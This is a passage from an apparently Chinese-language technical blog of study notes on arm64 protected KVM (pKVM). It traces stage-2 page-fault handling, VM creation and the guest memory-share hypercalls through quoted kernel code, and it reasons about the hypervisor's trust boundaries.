initiator.addr = host_addr;</span><br><span class=\"line\">                        initiator.host.completer_addr = guest_addr;</span><br><span class=\"line\">                        completer.id = PKVM_ID_GUEST;</span><br><span class=\"line\">                        completer.guest.phys = host_addr;</span><br><span class=\"line\">                        -&gt;do_donate&#123;</span><br><span class=\"line\">                            host_initiate_donation;</span><br><span class=\"line\">                                -&gt;host_stage2_set_owner_locked</span><br><span class=\"line\">                                    -&gt;kvm_pgtable_stage2_annotate(&amp;host_mmu.gpt)</span><br><span class=\"line\">                                        -&gt;kvm_pgtable_walk(pgt, stage2_map_walk);//phys=KVM_PHYS_INVALID</span><br><span class=\"line\">                            guest_complete_donation;</span><br><span class=\"line\">                                -&gt;kvm_pgtable_stage2_map(&amp;vm-&gt;gpt,guest_addr,host_addr);</span><br><span class=\"line\">                                    -&gt;kvm_pgtable_walk(pgt, stage2_map_walk);</span><br><span class=\"line\">                        &#125;</span><br><span class=\"line\">                    &#125;</span><br><span class=\"line\">               </span><br><span class=\"line\">    else</span><br><span class=\"line\">        user_mem_abort</span><br><span class=\"line\">            -&gt;kvm_pgtable_stage2_map</span><br><span class=\"line\">                -&gt;kvm_pgtable_walk(vcpu-&gt;arch.hw_mmu-&gt;pgt,stage2_map_walker)</span><br><span class=\"line\">&#125;</span><br></pre></td></tr></table></figure>\n\n<p>可以看到guest stage2的pf EL1会调用EL2的__pkvm_host_map_guest 这里先解开host stage2映射 然后加上guest stage2映射</p>\n<p>这非pkvm的情况下 直接在EL1调用kvm_pgtable_stage2_map调整好页表</p>\n<p>观察调用路径可以发现，这里handler完全是在EL1处理的 run完马上退到EL1 pkvm_mem_abort-&gt;kvm_call_hyp_nvhe(__pkvm_host_map_guest)再到EL2 这么做是否相信了EL1的hypervisor？ 可以选择在guest page fault的时候不unmap host？</p>\n<p>先在EL1 pin_user_page 拿到gpa</p>\n<p>非pkvm get_user_page 拿到gpa</p>\n<p>都是用的EL1接口 在EL1做 不知道区别是什么</p>\n<p>如果EL1可以任意准备物理内存页来攻击，EL2做的</p>\n<ul>\n<li>检查这个内存页之前是否属于host，如果不属于就拒绝</li>\n<li>从host stage2中unmap</li>\n</ul>\n<p>这两步能否保证guest内存的机密性和完整性？</p>\n<ul>\n<li>当一个内存页给guest以后 这块物理地址host永远不会访问</li>\n<li>当guest主动把自己的某个物理页给host share之前 guest可以清空数据</li>\n<li>guest不会被两个物理页映射到同一个ipa（host检查）</li>\n<li>guest不能相信第一次使用的物理页（page fault由host决定用哪个物理页 但是hyp可以清空这些数据）内存的初始状态？读磁盘？fs-verity依赖一个root hash 是否可以存在可信的EL2代码里？guest读取 拼接 验证 如果错误就是DOS</li>\n</ul>\n<p>如此分析 hpa给EL1管理没有问题 只要EL2检查通过即可</p>\n<h3 id=\"初始化VM\"><a href=\"#初始化VM\" class=\"headerlink\" title=\"初始化VM\"></a>初始化VM</h3><figure class=\"highlight c++\"><table><tr><td class=\"code\"><pre><span class=\"line\">kvm_vcpu_ioctl <span class=\"comment\">//virt/kvm/kvm_main.c</span></span><br><span class=\"line\">    <span class=\"function\">KVM_RUN </span></span><br><span class=\"line\"><span class=\"function\">        <span class=\"title\">unlikely</span><span class=\"params\">(oldpid != task_pid(current)<span class=\"comment\">//the thread running this vcpu changed</span></span></span></span><br><span class=\"line\"><span class=\"params\"><span class=\"function\">            kvm_arch_vcpu_run_pid_change</span></span></span><br><span class=\"line\"><span class=\"params\"><span class=\"function\">                -&gt;<span class=\"keyword\">if</span> (is_protected_kvm_enabled())</span></span></span><br><span class=\"line\"><span class=\"params\"><span class=\"function\">                     __pkvm_create_hyp_vm</span></span></span><br><span class=\"line\"><span class=\"params\"><span class=\"function\">                        -&gt;kvm_call_hyp_nvhe(__pkvm_init_vm);</span></span></span><br><span class=\"line\"><span class=\"params\"><span class=\"function\">                        __pkvm_init_vm</span></span></span><br><span class=\"line\"><span class=\"params\"><span class=\"function\">                        -&gt;insert_vm_table_entry</span></span></span><br><span class=\"line\"><span class=\"params\"><span class=\"function\">                            -&gt;hyp_vm-&gt;kvm.arch.mmu.pgt = &amp;hyp_vm-&gt;pgt</span></span></span><br><span class=\"line\"><span class=\"params\"><span class=\"function\">                        -&gt;kvm_guest_prepare_stage2</span></span></span><br><span class=\"line\"><span class=\"params\"><span class=\"function\">                            -&gt;__kvm_pgtable_stage2_init</span></span></span><br><span class=\"line\"><span class=\"params\"><span class=\"function\">                                -&gt;pgt-&gt;pgd = zalloc_pages_exact</span></span></span><br></pre></td></tr></table></figure>\n\n<p>不知道为什么这里入口是kvm run</p>\n<p><a href=\"https://github.com/torvalds/linux/commit/9d0c063a4d1d10ef8e6288899b8524413e40cfa0#diff-53d87d0b516f008da397a4b46f61c48934d55a53cc5c94686aa1d84fd8efaee4R154\">KVM: arm64: Instantiate pKVM hypervisor VM and vCPU structures from EL1 · torvalds&#x2F;linux@9d0c063</a></p>\n<p>非pkvm：</p>\n<figure class=\"highlight c++\"><table><tr><td class=\"code\"><pre><span class=\"line\">kvm_dev_ioctl</span><br><span class=\"line\">kvm_dev_ioctl_create_vm</span><br><span class=\"line\">kvm_create_vm <span class=\"comment\">//virt/kvm/kvm_main.c</span></span><br><span class=\"line\">    -&gt;kvm = kvm_arch_alloc_vm</span><br><span class=\"line\">      <span class=\"built_in\">mutex_init</span>(&amp;kvm-&gt;lock);</span><br><span class=\"line\">    kvm_arch_init_vm</span><br><span class=\"line\">          -&gt;<span class=\"built_in\">pkvm_init_host_vm</span>(kvm)&#123;</span><br><span class=\"line\">                <span class=\"keyword\">if</span> (!(type &amp; KVM_VM_TYPE_ARM_PROTECTED))</span><br><span class=\"line\">                    <span class=\"keyword\">return</span> <span class=\"number\">0</span>;</span><br><span class=\"line\">                <span class=\"keyword\">if</span> (!<span class=\"built_in\">is_protected_kvm_enabled</span>())</span><br><span class=\"line\">                        <span class=\"keyword\">return</span> -EINVAL;</span><br><span class=\"line\">                host_kvm-&gt;arch.pkvm.enabled = <span class=\"literal\">true</span>;</span><br><span class=\"line\">          &#125;</span><br><span class=\"line\">              </span><br><span class=\"line\">            <span class=\"built_in\">kvm_init_stage2_mmu</span>(kvm-&gt;arch.mmu)&#123;</span><br><span class=\"line\">            pgt = kzalloc</span><br><span class=\"line\">            kvm_pgtable_stage2_init</span><br><span class=\"line\">                -&gt;pgt-&gt;pgd = zalloc_pages_exact</span><br><span class=\"line\">            mmu-&gt;pgt = pgt;</span><br><span class=\"line\">            mmu-&gt;pgd_phys = __pa(pgt-&gt;pgd);</span><br><span class=\"line\">            </span><br><span class=\"line\">        &#125;</span><br></pre></td></tr></table></figure>\n\n<p>是否pkvm不希望大改目前的kvm逻辑 因此选择把入口加到了kvm_arch_vcpu_run_pid_change中？</p>\n<p>具体需要看crosvm的逻辑 但是不重要 知道怎么初始化就行 可以认为这个项目只跑pvm 不需要兼容vm</p>\n<p>host qemu启动指令：</p>\n<figure class=\"highlight c++\"><table><tr><td class=\"code\"><pre><span class=\"line\">/repos/qemu/build/aarch64-softmmu/qemu-system-aarch64 -M virt        \\</span><br><span class=\"line\">      -machine virtualization=<span class=\"literal\">true</span> -machine virt,gic-version=<span class=\"number\">3</span>  \\</span><br><span class=\"line\">      -cpu cortex-a72 -smp <span class=\"number\">2</span> -m <span class=\"number\">4096</span>                   \\</span><br><span class=\"line\">      -drive <span class=\"keyword\">if</span>=pflash,format=raw,file=efi.img,readonly     \\</span><br><span class=\"line\">      -drive <span class=\"keyword\">if</span>=pflash,format=raw,file=varstore.img         \\</span><br><span class=\"line\">      -drive <span class=\"keyword\">if</span>=virtio,format=qcow2,file=disk.img           \\</span><br><span class=\"line\">      -device virtio-scsi-pci,id=scsi0              \\</span><br><span class=\"line\">      -object rng-random,filename=/dev/urandom,id=rng0      \\</span><br><span class=\"line\">      -device virtio-rng-pci,rng=rng0               \\</span><br><span class=\"line\">      -device virtio-net-pci,netdev=net0                \\</span><br><span class=\"line\">      -netdev user,id=net0,hostfwd=tcp::<span class=\"number\">8022</span>-:<span class=\"number\">22</span>            \\</span><br><span class=\"line\">      -nographic                           \\</span><br><span class=\"line\">      -kernel ~/repos/linux-pkvm-verif/arch/arm64/boot/Image -append <span class=\"string\">&quot;earlycon nokaslr kvm-arm.mode=protected root=/dev/vda2&quot;</span> </span><br><span class=\"line\">   </span><br></pre></td></tr></table></figure>\n\n<p>guest vmm 看crosvm</p>\n<h3 id=\"切换\"><a href=\"#切换\" class=\"headerlink\" title=\"切换\"></a>切换</h3><p>hyp&#x2F;nvhe&#x2F;switch.c</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"code\"><pre><span class=\"line\">__pkvm_create_hyp_vm</span><br><span class=\"line\">    -&gt;__pkvm_init_vcpu</span><br><span class=\"line\">        -&gt;init_pkvm_hyp_vcpu</span><br><span class=\"line\">            -&gt;vcpu.arch.hw_mmu = &amp;hyp_vm-&gt;kvm.arch.mmu; //hyp/nvhe/pkvm.c</span><br><span class=\"line\">        </span><br><span class=\"line\"></span><br><span class=\"line\">kvm_vm_ioctl_create_vcpu</span><br><span class=\"line\">    -&gt;kvm_arch_vcpu_create</span><br><span class=\"line\">        -&gt;vcpu-&gt;arch.hw_mmu = &amp;vcpu-&gt;kvm-&gt;arch.mmu; //arm.c        </span><br><span class=\"line\"></span><br><span class=\"line\"></span><br><span class=\"line\">kvm_arch_vcpu_ioctl_run</span><br><span class=\"line\">-&gt;kvm_arm_vcpu_enter_exit</span><br><span class=\"line\">    -&gt;kvm_call_hyp_ret(__kvm_vcpu_run)</span><br><span class=\"line\">__kvm_vcpu_run&#123;</span><br><span class=\"line\">    __load_stage2(vcpu-&gt;arch.hw_mmu);</span><br><span class=\"line\">    do&#123;</span><br><span class=\"line\">        exit_code = __guest_enter(vcpu);</span><br><span class=\"line\">    &#125;while(fixup_guest_exit(vcpu, &amp;exit_code));</span><br><span class=\"line\">    __load_host_stage2();</span><br><span class=\"line\">        -&gt;__load_stage2(&amp;host_mmu.arch.mmu, &amp;host_mmu.arch)</span><br><span class=\"line\">            -&gt;write_sysreg(kvm_get_vttbr(mmu), vttbr_el2);</span><br><span class=\"line\">                -&gt;kvm_phys_to_vttbr(mmu-&gt;pgd_phys) | mmu-&gt;vmid.id &lt;&lt; SHIFT | cnp</span><br><span class=\"line\">&#125;</span><br></pre></td></tr></table></figure>\n\n<p>kvm_vm_ioctl_create_vcpu在vcpu_run之前 所以在__pkvm_create_hyp_vm之前</p>\n<p>因此为传统vm准备的stage2页表等资源会被pkvm的初始化覆盖，代码执行、资源准备，但是完全没有使用？</p>\n<p>开了pkvm的host支持pvm和normal vm</p>\n<p>可以看到guest使用的stage2页表完全是由EL2的hyp来操作的 EL1应该是提供了一段内存 EL2会先把这段内存unmap掉 然后用于分配EL2页表</p>\n<p>在x86或arm上 EPT&#x2F;stage2pt都是由kvm准备（分配内存并且map） 而并非像hm一样由用户态或sysmgr准备好然后作为参数传入 （uvmm-&gt;sysmgr-&gt;hmvirt） sysmgr是否扮演的是kvm的角色？</p>\n<h3 id=\"hypercall共享内存\"><a href=\"#hypercall共享内存\" class=\"headerlink\" title=\"hypercall共享内存\"></a>hypercall共享内存</h3><h4 id=\"Guest\"><a href=\"#Guest\" class=\"headerlink\" title=\"Guest\"></a>Guest</h4><p>pkvm-android-mainline-6.6</p>\n<figure class=\"highlight c++\"><table><tr><td class=\"code\"><pre><span class=\"line\"><span class=\"meta\">#<span class=\"keyword\">ifndef</span> ARM_SMCCC_KVM_FUNC_HYP_MEMINFO</span></span><br><span class=\"line\"><span class=\"meta\">#<span class=\"keyword\">define</span> ARM_SMCCC_KVM_FUNC_HYP_MEMINFO        2</span></span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"meta\">#<span class=\"keyword\">define</span> ARM_SMCCC_VENDOR_HYP_KVM_HYP_MEMINFO_FUNC_ID                        \\</span></span><br><span class=\"line\"><span class=\"meta\">        ARM_SMCCC_CALL_VAL(ARM_SMCCC_FAST_CALL,                                \\</span></span><br><span class=\"line\"><span class=\"meta\">                           ARM_SMCCC_SMC_64,                                \\</span></span><br><span class=\"line\"><span class=\"meta\">                           ARM_SMCCC_OWNER_VENDOR_HYP,                        \\</span></span><br><span class=\"line\"><span class=\"meta\">                           ARM_SMCCC_KVM_FUNC_HYP_MEMINFO)</span></span><br><span class=\"line\"><span class=\"meta\">#<span class=\"keyword\">endif</span>        <span class=\"comment\">/* ARM_SMCCC_KVM_FUNC_HYP_MEMINFO */</span></span></span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"meta\">#<span class=\"keyword\">ifndef</span> ARM_SMCCC_KVM_FUNC_MEM_SHARE</span></span><br><span class=\"line\"><span class=\"meta\">#<span class=\"keyword\">define</span> ARM_SMCCC_KVM_FUNC_MEM_SHARE        3</span></span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"meta\">#<span class=\"keyword\">define</span> ARM_SMCCC_VENDOR_HYP_KVM_MEM_SHARE_FUNC_ID                        \\</span></span><br><span class=\"line\"><span class=\"meta\">        ARM_SMCCC_CALL_VAL(ARM_SMCCC_FAST_CALL,                                \\</span></span><br><span class=\"line\"><span class=\"meta\">                           ARM_SMCCC_SMC_64,                                \\</span></span><br><span class=\"line\"><span class=\"meta\">                           ARM_SMCCC_OWNER_VENDOR_HYP,                        \\</span></span><br><span class=\"line\"><span class=\"meta\">                           ARM_SMCCC_KVM_FUNC_MEM_SHARE)</span></span><br><span class=\"line\"><span class=\"meta\">#<span class=\"keyword\">endif</span>        <span class=\"comment\">/* ARM_SMCCC_KVM_FUNC_MEM_SHARE */</span></span></span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"meta\">#<span class=\"keyword\">ifndef</span> ARM_SMCCC_KVM_FUNC_MEM_UNSHARE</span></span><br><span class=\"line\"><span class=\"meta\">#<span class=\"keyword\">define</span> ARM_SMCCC_KVM_FUNC_MEM_UNSHARE        4</span></span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"meta\">#<span class=\"keyword\">define</span> ARM_SMCCC_VENDOR_HYP_KVM_MEM_UNSHARE_FUNC_ID                        \\</span></span><br><span class=\"line\"><span class=\"meta\">        ARM_SMCCC_CALL_VAL(ARM_SMCCC_FAST_CALL,                                \\</span></span><br><span class=\"line\"><span class=\"meta\">                           ARM_SMCCC_SMC_64,                                \\</span></span><br><span class=\"line\"><span class=\"meta\">                           ARM_SMCCC_OWNER_VENDOR_HYP,                        \\</span></span><br><span class=\"line\"><span class=\"meta\">                           ARM_SMCCC_KVM_FUNC_MEM_UNSHARE)</span></span><br><span class=\"line\"><span class=\"meta\">#<span class=\"keyword\">endif</span>        <span class=\"comment\">/* ARM_SMCCC_KVM_FUNC_MEM_UNSHARE */</span></span></span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"type\">static</span> <span class=\"type\">unsigned</span> <span class=\"type\">long</span> memshare_granule_sz;</span><br><span class=\"line\"><span class=\"type\">static</span> <span class=\"type\">bool</span> memshare_has_range;</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"function\"><span class=\"type\">bool</span> <span class=\"title\">mem_encrypt_active</span><span class=\"params\">(<span class=\"type\">void</span>)</span></span></span><br><span class=\"line\"><span class=\"function\"></span>&#123;</span><br><span class=\"line\">        <span class=\"keyword\">return</span> memshare_granule_sz;</span><br><span class=\"line\">&#125;</span><br><span class=\"line\"><span class=\"built_in\">EXPORT_SYMBOL</span>(mem_encrypt_active);</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"function\"><span class=\"type\">void</span> <span class=\"title\">kvm_init_memshare_services</span><span class=\"params\">(<span class=\"type\">void</span>)</span></span></span><br><span class=\"line\"><span class=\"function\"></span>&#123;</span><br><span class=\"line\">        <span class=\"type\">int</span> i;</span><br><span class=\"line\">        <span class=\"keyword\">struct</span> <span class=\"title class_\">arm_smccc_res</span> res;</span><br><span class=\"line\">        <span class=\"type\">const</span> u32 funcs[] = &#123;</span><br><span class=\"line\">                ARM_SMCCC_KVM_FUNC_HYP_MEMINFO,</span><br><span class=\"line\">                ARM_SMCCC_KVM_FUNC_MEM_SHARE,</span><br><span class=\"line\">                ARM_SMCCC_KVM_FUNC_MEM_UNSHARE,</span><br><span class=\"line\">        &#125;;</span><br><span class=\"line\">        <span class=\"type\">long</span> ret;</span><br><span class=\"line\"></span><br><span class=\"line\">        <span class=\"keyword\">for</span> (i = <span class=\"number\">0</span>; i &lt; <span class=\"built_in\">ARRAY_SIZE</span>(funcs); ++i) &#123;</span><br><span class=\"line\">                <span class=\"keyword\">if</span> (!<span class=\"built_in\">kvm_arm_hyp_service_available</span>(funcs[i]))</span><br><span class=\"line\">                        <span class=\"keyword\">return</span>;</span><br><span class=\"line\">        &#125;</span><br><span class=\"line\"></span><br><span class=\"line\">        <span class=\"built_in\">arm_smccc_1_1_invoke</span>(ARM_SMCCC_VENDOR_HYP_KVM_HYP_MEMINFO_FUNC_ID,</span><br><span class=\"line\">                             <span class=\"number\">0</span>, <span class=\"number\">0</span>, <span class=\"number\">0</span>, &amp;res);</span><br><span class=\"line\">        ret = (<span class=\"type\">long</span>)res.a0;</span><br><span class=\"line\">        <span class=\"keyword\">if</span> (ret &lt; <span class=\"number\">0</span>)</span><br><span class=\"line\">                <span class=\"keyword\">return</span>;</span><br><span class=\"line\"></span><br><span class=\"line\">        memshare_has_range = !!(res.a1 &amp; KVM_FUNC_HAS_RANGE);</span><br><span class=\"line\">        memshare_granule_sz = ret;</span><br><span class=\"line\">&#125;</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"type\">static</span> <span class=\"type\">int</span> __invoke_memshare(<span class=\"type\">unsigned</span> <span class=\"type\">long</span> addr, <span class=\"type\">int</span> numpages, <span class=\"type\">int</span> func_id,</span><br><span class=\"line\">                             u64 *done)</span><br><span class=\"line\">&#123;</span><br><span class=\"line\">        u64 size_arg = memshare_has_range ? numpages * PAGE_SIZE : <span class=\"number\">0</span>;</span><br><span class=\"line\">        <span class=\"keyword\">struct</span> <span class=\"title class_\">arm_smccc_res</span> res;</span><br><span class=\"line\"></span><br><span class=\"line\">        <span class=\"built_in\">arm_smccc_1_1_invoke</span>(func_id, <span class=\"built_in\">virt_to_phys</span>((<span class=\"type\">void</span> *)addr),</span><br><span class=\"line\">                             size_arg, <span class=\"number\">0</span>, &amp;res);</span><br><span class=\"line\">        <span class=\"keyword\">if</span> (res.a0 != SMCCC_RET_SUCCESS)</span><br><span class=\"line\">                <span class=\"keyword\">return</span> -EPERM;</span><br><span class=\"line\"></span><br><span class=\"line\">        *done = memshare_has_range ? res.a1 : memshare_granule_sz;</span><br><span class=\"line\"></span><br><span class=\"line\">        <span class=\"keyword\">return</span> <span class=\"number\">0</span>;</span><br><span class=\"line\">&#125;</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"function\"><span class=\"type\">static</span> <span class=\"type\">int</span> <span class=\"title\">set_memory_xcrypted</span><span class=\"params\">(u32 func_id, <span class=\"type\">unsigned</span> <span class=\"type\">long</span> start, <span class=\"type\">int</span> numpages)</span></span></span><br><span class=\"line\"><span class=\"function\"></span>&#123;</span><br><span class=\"line\">        <span class=\"keyword\">if</span> (!memshare_granule_sz)</span><br><span class=\"line\">                <span class=\"keyword\">return</span> <span class=\"number\">0</span>;</span><br><span class=\"line\"></span><br><span class=\"line\">        <span class=\"keyword\">if</span> (<span class=\"built_in\">WARN_ON</span>(!<span class=\"built_in\">PAGE_ALIGNED</span>(start)))</span><br><span class=\"line\">                <span class=\"keyword\">return</span> -EINVAL;</span><br><span class=\"line\"></span><br><span class=\"line\">        <span class=\"keyword\">if</span> ((PAGE_SIZE * numpages) % memshare_granule_sz)</span><br><span class=\"line\">                <span class=\"keyword\">return</span> -ERANGE;</span><br><span class=\"line\"></span><br><span class=\"line\">        <span class=\"keyword\">while</span> (numpages &gt; <span class=\"number\">0</span>) &#123;</span><br><span class=\"line\">                u64 done;</span><br><span class=\"line\">                <span class=\"type\">int</span> ret;</span><br><span class=\"line\"></span><br><span class=\"line\">                ret = __invoke_memshare(start, numpages, func_id, &amp;done);</span><br><span class=\"line\">                <span class=\"keyword\">if</span> (ret)</span><br><span class=\"line\">                        <span class=\"keyword\">return</span> ret;</span><br><span class=\"line\"></span><br><span class=\"line\">                <span class=\"built_in\">WARN_ON</span>(done &gt;&gt; PAGE_SHIFT &gt; numpages);</span><br><span class=\"line\"></span><br><span class=\"line\">                numpages -= done &gt;&gt; PAGE_SHIFT;</span><br><span class=\"line\">                start += done;</span><br><span class=\"line\">        &#125;</span><br><span class=\"line\"></span><br><span class=\"line\">        <span class=\"keyword\">return</span> <span class=\"number\">0</span>;</span><br><span class=\"line\">&#125;</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"function\"><span class=\"type\">int</span> <span class=\"title\">set_memory_encrypted</span><span class=\"params\">(<span class=\"type\">unsigned</span> <span class=\"type\">long</span> addr, <span class=\"type\">int</span> numpages)</span></span></span><br><span class=\"line\"><span class=\"function\"></span>&#123;</span><br><span class=\"line\">        <span class=\"keyword\">return</span> <span class=\"built_in\">set_memory_xcrypted</span>(ARM_SMCCC_VENDOR_HYP_KVM_MEM_UNSHARE_FUNC_ID,</span><br><span class=\"line\">                                   addr, numpages);</span><br><span class=\"line\">&#125;</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"function\"><span class=\"type\">int</span> <span class=\"title\">set_memory_decrypted</span><span class=\"params\">(<span class=\"type\">unsigned</span> <span class=\"type\">long</span> addr, <span class=\"type\">int</span> numpages)</span></span></span><br><span class=\"line\"><span class=\"function\"></span>&#123;</span><br><span class=\"line\">        <span class=\"keyword\">return</span> <span class=\"built_in\">set_memory_xcrypted</span>(ARM_SMCCC_VENDOR_HYP_KVM_MEM_SHARE_FUNC_ID,</span><br><span class=\"line\">                                   addr, numpages);</span><br><span class=\"line\">&#125;</span><br></pre></td></tr></table></figure>\n\n<h4 id=\"host\"><a href=\"#host\" class=\"headerlink\" title=\"host\"></a>host</h4><figure class=\"highlight plaintext\"><table><tr><td class=\"code\"><pre><span class=\"line\">kvm_handle_pvm_hvc64</span><br><span class=\"line\">pkvm_memshare_call</span><br><span class=\"line\">__pkvm_guest_share_host</span><br><span class=\"line\">do_share</span><br><span class=\"line\">__do_share</span><br><span class=\"line\">static const exit_handler_fn pvm_exit_handlers[] = &#123;</span><br><span class=\"line\">    [0 ... ESR_ELx_EC_MAX]      = NULL,</span><br><span class=\"line\">    [ESR_ELx_EC_HVC64]      = kvm_handle_pvm_hvc64,</span><br><span class=\"line\">    [ESR_ELx_EC_SYS64]      = kvm_handle_pvm_sys64,</span><br><span class=\"line\">    [ESR_ELx_EC_SVE]        = kvm_handle_pvm_restricted,</span><br><span class=\"line\">    [ESR_ELx_EC_SME]        = kvm_handle_pvm_restricted,</span><br><span class=\"line\">    [ESR_ELx_EC_FP_ASIMD]       = kvm_hyp_handle_fpsimd,</span><br><span class=\"line\">    [ESR_ELx_EC_IABT_LOW]       = kvm_hyp_handle_iabt_low,</span><br><span class=\"line\">    [ESR_ELx_EC_DABT_LOW]       = kvm_hyp_handle_dabt_low,</span><br><span class=\"line\">    [ESR_ELx_EC_WATCHPT_LOW]    = kvm_hyp_handle_watchpt_low,</span><br><span class=\"line\">    [ESR_ELx_EC_MOPS]       = kvm_hyp_handle_mops,</span><br><span class=\"line\">&#125;;</span><br><span class=\"line\"></span><br><span class=\"line\">#define ARM_SMCCC_KVM_FUNC_MEM_SHARE        3</span><br><span class=\"line\">#define ARM_SMCCC_KVM_FUNC_MEM_UNSHARE      4</span><br><span class=\"line\"></span><br><span class=\"line\">#define ARM_SMCCC_CALL_VAL(type, calling_convention, owner, func_num) \\</span><br><span class=\"line\">    (((type) &lt;&lt; ARM_SMCCC_TYPE_SHIFT) | \\</span><br><span class=\"line\">    ((calling_convention) &lt;&lt; ARM_SMCCC_CALL_CONV_SHIFT) | \\</span><br><span class=\"line\">    (((owner) &amp; ARM_SMCCC_OWNER_MASK) &lt;&lt; ARM_SMCCC_OWNER_SHIFT) | \\</span><br><span class=\"line\">    ((func_num) &amp; ARM_SMCCC_FUNC_MASK))</span><br><span class=\"line\"></span><br><span class=\"line\"></span><br><span class=\"line\"></span><br><span class=\"line\">#define ARM_SMCCC_VENDOR_HYP_KVM_MEM_SHARE_FUNC_ID          \\</span><br><span class=\"line\">    ARM_SMCCC_CALL_VAL(ARM_SMCCC_FAST_CALL,             \\</span><br><span class=\"line\">               ARM_SMCCC_SMC_64,                \\</span><br><span class=\"line\">               ARM_SMCCC_OWNER_VENDOR_HYP,          \\</span><br><span class=\"line\">               ARM_SMCCC_KVM_FUNC_MEM_SHARE)</span><br><span class=\"line\"></span><br><span class=\"line\">#define ARM_SMCCC_VENDOR_HYP_KVM_MEM_UNSHARE_FUNC_ID            \\</span><br><span class=\"line\">    ARM_SMCCC_CALL_VAL(ARM_SMCCC_FAST_CALL,             \\</span><br><span class=\"line\">               ARM_SMCCC_SMC_64,                \\</span><br><span class=\"line\">               ARM_SMCCC_OWNER_VENDOR_HYP,          \\</span><br><span class=\"line\">               ARM_SMCCC_KVM_FUNC_MEM_UNSHARE)</span><br><span class=\"line\"></span><br><span class=\"line\"></span><br><span class=\"line\"></span><br><span class=\"line\">static inline u32 smccc_get_function(struct kvm_vcpu *vcpu)</span><br><span class=\"line\">&#123;</span><br><span class=\"line\">    return vcpu_get_reg(vcpu, 0);</span><br><span class=\"line\">&#125;</span><br><span class=\"line\">/*</span><br><span class=\"line\"> * vcpu_get_reg and vcpu_set_reg should always be passed a register number</span><br><span class=\"line\"> * coming from a read of ESR_EL2. Otherwise, it may give the wrong result on</span><br><span class=\"line\"> * AArch32 with banked registers.</span><br><span class=\"line\"> */</span><br><span class=\"line\">static __always_inline unsigned long vcpu_get_reg(const struct kvm_vcpu *vcpu,</span><br><span class=\"line\">                     u8 reg_num)</span><br><span class=\"line\">&#123;</span><br><span class=\"line\">    return (reg_num == 31) ? 0 : vcpu_gp_regs(vcpu)-&gt;regs[reg_num];</span><br><span class=\"line\">&#125;</span><br><span class=\"line\">/*</span><br><span class=\"line\"> * Handler for protected VM HVC calls.</span><br><span class=\"line\"> *</span><br><span class=\"line\"> * Returns true if the hypervisor has handled the exit, and control should go</span><br><span class=\"line\"> * back to the guest, or false if it hasn&#x27;t.</span><br><span class=\"line\"> */</span><br><span class=\"line\">bool kvm_handle_pvm_hvc64(struct kvm_vcpu *vcpu, u64 *exit_code)</span><br><span class=\"line\">&#123;</span><br><span class=\"line\">    u64 val[4] = &#123; SMCCC_RET_NOT_SUPPORTED &#125;;</span><br><span class=\"line\">    u32 fn = smccc_get_function(vcpu);</span><br><span class=\"line\">    struct pkvm_hyp_vcpu *hyp_vcpu;</span><br><span class=\"line\"></span><br><span class=\"line\">    hyp_vcpu = container_of(vcpu, struct pkvm_hyp_vcpu, vcpu);</span><br><span class=\"line\"></span><br><span class=\"line\">    switch (fn) &#123;</span><br><span class=\"line\">    case ARM_SMCCC_VERSION_FUNC_ID:</span><br><span class=\"line\">        /* Nothing to be handled by the host. Go back to the guest. */</span><br><span class=\"line\">        val[0] = ARM_SMCCC_VERSION_1_1;</span><br><span class=\"line\">        break;</span><br><span class=\"line\">    case ARM_SMCCC_VENDOR_HYP_CALL_UID_FUNC_ID:</span><br><span class=\"line\">        val[0] = ARM_SMCCC_VENDOR_HYP_UID_KVM_REG_0;</span><br><span class=\"line\">        val[1] = ARM_SMCCC_VENDOR_HYP_UID_KVM_REG_1;</span><br><span class=\"line\">        val[2] = ARM_SMCCC_VENDOR_HYP_UID_KVM_REG_2;</span><br><span class=\"line\">        val[3] = ARM_SMCCC_VENDOR_HYP_UID_KVM_REG_3;</span><br><span class=\"line\">        break;</span><br><span class=\"line\">    case ARM_SMCCC_VENDOR_HYP_KVM_FEATURES_FUNC_ID:</span><br><span class=\"line\">        val[0] = BIT(ARM_SMCCC_KVM_FUNC_FEATURES);</span><br><span class=\"line\">        val[0] |= BIT(ARM_SMCCC_KVM_FUNC_HYP_MEMINFO);</span><br><span class=\"line\">        val[0] |= BIT(ARM_SMCCC_KVM_FUNC_MEM_SHARE);</span><br><span class=\"line\">        val[0] |= BIT(ARM_SMCCC_KVM_FUNC_MEM_UNSHARE);</span><br><span class=\"line\">        break;</span><br><span class=\"line\">    case ARM_SMCCC_VENDOR_HYP_KVM_HYP_MEMINFO_FUNC_ID:</span><br><span class=\"line\">        if (smccc_get_arg1(vcpu) ||</span><br><span class=\"line\">            smccc_get_arg2(vcpu) ||</span><br><span class=\"line\">            smccc_get_arg3(vcpu)) &#123;</span><br><span class=\"line\">            val[0] = SMCCC_RET_INVALID_PARAMETER;</span><br><span class=\"line\">        &#125; else &#123;</span><br><span class=\"line\">            val[0] = PAGE_SIZE;</span><br><span class=\"line\">        &#125;</span><br><span class=\"line\">        break;</span><br><span class=\"line\">    case ARM_SMCCC_VENDOR_HYP_KVM_MEM_SHARE_FUNC_ID:</span><br><span class=\"line\">        return pkvm_memshare_call(hyp_vcpu, exit_code);</span><br><span class=\"line\">    case ARM_SMCCC_VENDOR_HYP_KVM_MEM_UNSHARE_FUNC_ID:</span><br><span class=\"line\">        return pkvm_memunshare_call(hyp_vcpu);</span><br><span class=\"line\">    default:</span><br><span class=\"line\">        return pkvm_handle_psci(hyp_vcpu);</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\"></span><br><span class=\"line\">    smccc_set_retval(vcpu, val[0], val[1], val[2], val[3]);</span><br><span class=\"line\">    return true;</span><br><span class=\"line\">&#125;</span><br></pre></td></tr></table></figure>\n\n<p>pgatble.pgd 是ttbr0_el2</p>\n<p>host_mmu 是vttbr_el2 </p>\n<p>如何配置host stage2？ fix_host_ownership与host pf</p>\n<h3 